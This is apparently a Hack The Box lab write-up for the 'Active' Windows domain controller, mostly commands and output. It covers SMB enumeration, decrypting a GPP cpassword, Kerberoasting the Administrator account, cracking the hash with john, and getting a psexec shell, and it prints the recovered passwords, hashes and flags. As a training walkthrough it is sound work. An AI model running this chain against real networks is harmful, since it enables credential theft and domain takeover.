###### tags: `Hack the box` `HTB` `Easy`

# Active
```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.226.61 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.226.61:53
Open 10.129.226.61:88
Open 10.129.226.61:135
Open 10.129.226.61:139
Open 10.129.226.61:389
Open 10.129.226.61:445
Open 10.129.226.61:464
Open 10.129.226.61:593
Open 10.129.226.61:636
Open 10.129.226.61:3269
Open 10.129.226.61:3268
Open 10.129.226.61:5722
Open 10.129.226.61:9389
Open 10.129.226.61:49152
Open 10.129.226.61:49153
Open 10.129.226.61:49155
Open 10.129.226.61:49154
Open 10.129.226.61:49157
Open 10.129.226.61:49158
Open 10.129.226.61:49169
Open 10.129.226.61:49173
Open 10.129.226.61:49174
Open 10.129.226.61:47001

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  tcpwrapped    syn-ack
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  tcpwrapped    syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5722/tcp  open  msrpc         syn-ack Microsoft Windows RPC
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         syn-ack Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack Microsoft Windows RPC
49169/tcp open  msrpc         syn-ack Microsoft Windows RPC
49173/tcp open  msrpc         syn-ack Microsoft Windows RPC
49174/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

smb列出來看看，登入`Replication`下載
```
┌──(kali㉿kali)-[~/htb]
└─$ smbclient -N -L 10.129.226.61                                              
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.226.61 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

┌──(kali㉿kali)-[~/htb]
└─$ smbclient -N //10.129.226.61/Replication

smb: \> RECURSE ON
smb: \> PROMPT OFF
smb: \> mget *
```

可在`/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml`得到帳號`SVC_TGS`還有`cpassword`
```
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

搜尋`cnpassword decrypt`，找到`gpp-decrypt`
```
┌──(kali㉿kali)-[~/htb]
└─$ gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
GPPstillStandingStrong2k18
```

smbmap
```
┌──(kali㉿kali)-[~/htb]
└─$ smbmap -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.129.226.61

[+] IP: 10.129.226.61:445       Name: 10.129.226.61             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
```

登入在`\SVC_TGS\Desktop\`可得user.txt
```
┌──(kali㉿kali)-[~/htb]
└─$ smbclient //10.129.226.61/Users -U SVC_TGS%GPPstillStandingStrong2k18

smb: \> dir
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018
  
smb: \> cd SVC_TGS
smb: \SVC_TGS\> dir
  .                                   D        0  Sat Jul 21 11:16:32 2018
  ..                                  D        0  Sat Jul 21 11:16:32 2018
  Contacts                            D        0  Sat Jul 21 11:14:11 2018
  Desktop                             D        0  Sat Jul 21 11:14:42 2018
  Downloads                           D        0  Sat Jul 21 11:14:23 2018
  Favorites                           D        0  Sat Jul 21 11:14:44 2018
  Links                               D        0  Sat Jul 21 11:14:57 2018
  My Documents                        D        0  Sat Jul 21 11:15:03 2018
  My Music                            D        0  Sat Jul 21 11:15:32 2018
  My Pictures                         D        0  Sat Jul 21 11:15:43 2018
  My Videos                           D        0  Sat Jul 21 11:15:53 2018
  Saved Games                         D        0  Sat Jul 21 11:16:12 2018
  Searches                            D        0  Sat Jul 21 11:16:24 2018

smb: \SVC_TGS\Desktop\> get user.txt

┌──(kali㉿kali)-[~/htb]
└─$ cat user.txt       
79dfb2034e94c77339d11e66843bfc55
```

`Kerberoasting`
```
┌──(kali㉿kali)-[~/htb]
└─$ python3 GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.226.61 -request
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2024-05-26 21:53:22.627751             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$49e8bc0487494ac46c9b0010c09600a3$61fb4773818c71676b11c5fa42bc3ef1a19f41827fc3e3d5352d923ae4b88f7ab5809584624932b9faaef6eec264061571024f438d00d9d8a38f8ae8ab01b87637bb5d69813e2be2d073d12970df75df8e2923591020032f62eec35fea14780a7fcbf56a801a6918b0e9d8068c713e43d04f052d484a55ab2332273416563dd7d8be4b5bd0410ced44f15cc455c9f3c89ae7c72963295d6db440608cb52c87495060b9cb80b12ea6bbd763ff8e9eb62627ec9f076717417dca46c3d537b83e0c1a2159633d29c2d5928a6d2d7e43f4a552c5e94b479f53c7d65553bc4c0879f1d2e80e5e4ec98877f0d4571fc0d27d088f433dd8ab5ccdfd7d1b7b5d76f664e68d268cd7746529ee5e8583c6e1650f1cd42632c7c0e3435660f104339bd45ec131aefd2b76d1bea625b3f4d27d1a4bdb7d56c741a86e4a55ca3082c963cf4e8eab1570301496d3a8e546a8fea8a51e580d798fe5bf5811d2216c53229f6a1ae1c6a3662d15e5e8e9667f14a07eb29a7ca81122c2a90c68f8f470deae1612a79efdd41ceff21a723472e79d168dfdeb4e62e15f9685c069a3942c591ba1786889cbeea3ccd3e0f2092e0b38c7eebfbf595aa85382f0709ab92af2f865a108d099e5219d2d5659c7066edcada6157c459dea31cc8c3d8a3ba3ded4a24c01bada17a4f5778a8d22979a154dd1e770d71cfc0c035eb55f3af4fce6ad8a2f01ea14c53b7c77f3ddd61671539236eb30477a7931f75dd64746fa3351644e7fd03d9036ade7a63a4b9f4593d19d34f4fe736b1531ba139a9c8f2cebf41600b5995ac164193f00bc5de1118bcd1d938a4cf1434404f6a80a22dac3fb6a6030f03b20e9b8529c98bfcd1480fef76dd5bb97f5903135b0d79ed86699332de4c5a76c0063f7804c95f63e42fc4418b8a84b3be9071476724b03f0b35c81b5da92981c820e8646caa7ec7a147d727ce5353b0e067a286aa1e890c5bffb88b3fbb9c05261e0fea032744a81a65688b0d4c5954b037b0a06bae113fd997ee1ec3df37ac75feae4eae35dd3be367aee425b1ed22a0e5ac837a3929f2252dbe1f6c370ee06a5dd913a37409504410c066d638f77c011a84351c2a39b461de9f6c8d92dea3ae156bafdfb7d8812afc4242fcfd25e309285a0c2ba42bccce34ab8535913791d03fc6bdfa0f2bb14e0918bc4fcea6a047901f5dcd98bb81746e41c1ff2992b49275995ce1200a944ec1690003629a772436fb732c13ba1fe2a99d832da
```

john破
```
┌──(kali㉿kali)-[~/htb]
└─$ john administrator --wordlist=/home/kali/rockyou.txt 

Ticketmaster1968 (?)
```

登入`administrator`在`C:\Users\Administrator\Desktop`得root.txt
```
┌──(kali㉿kali)-[~/htb]
└─$ impacket-psexec active.htb/administrator@10.129.226.61

C:\Users\Administrator\Desktop> type root.txt
625eaf1385c91f298757e64d493e1ac3
```